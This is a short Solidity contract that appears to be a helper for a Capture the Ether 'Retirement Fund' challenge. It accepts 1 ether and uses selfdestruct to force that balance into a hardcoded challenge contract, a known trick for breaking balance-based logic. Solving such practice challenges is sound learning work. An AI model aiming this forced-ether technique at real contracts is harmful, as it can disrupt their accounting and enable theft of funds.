// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

/// @title The challenge helper
/// @author kyrers
/// @notice This will fund the contract with some ether after it is destructed
contract RetirementFundHelper {
    /// @notice Contract constructor. Needs to receive 1 ether
    constructor() payable {
        require(msg.value == 1 ether);
    }

    // Destroy the contract and send its balance to the CTE challenge contract
    function kill() public {
        selfdestruct(payable(address(0x478A0B879359A86F831C4583bc88E2a5b5500188)));
    }
}